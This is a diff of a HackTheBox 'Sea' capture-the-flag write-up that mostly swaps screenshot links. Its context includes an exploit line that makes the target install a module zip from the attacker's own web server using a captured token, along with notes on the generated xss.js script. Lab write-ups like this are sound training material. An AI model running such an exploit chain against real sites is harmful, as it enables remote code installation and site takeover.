@@ -138,11 +138,10 @@ Now change this address in the exploit code to reference our locally hosted web 
 
 	var urlRev = urlWithoutLogBase+"/?installModule=http://[LOCAL IP]:[WEB SERVER PORT]/main.zip&directoryName=violet&type=themes&token=" + token;
 
-![Screenshot of Contact Form - Filled with XSS](/Assets/HtB/Sea/exploit_changed_ip.png)
+![Screenshot of changed exploit code](/Assets/HtB/Sea/exploit_code_changed_ip.png)
 
 While we're at it, let's check xss.js as well. This file will be generated every time we run the exploit, but it can't hurt to understand better what is going on. Now, I will not claim to be an expert in javascript, so I'm going to share a new trick with you. Let's take the first portion of this script and verify its functionality in our browser console:
 
-![Screenshot of XSS Code](/Assets/HtB/Sea/xss_copy.png)
 ![Screenshot of XSS in browser console](/Assets/HtB/Sea/xss_console.png)
 
 So it looks like urlWithoutLog shows the full host: http://sea.htb. However, urlWithoutLogBase only shows the root directory: /. So let's put this in context of the script:
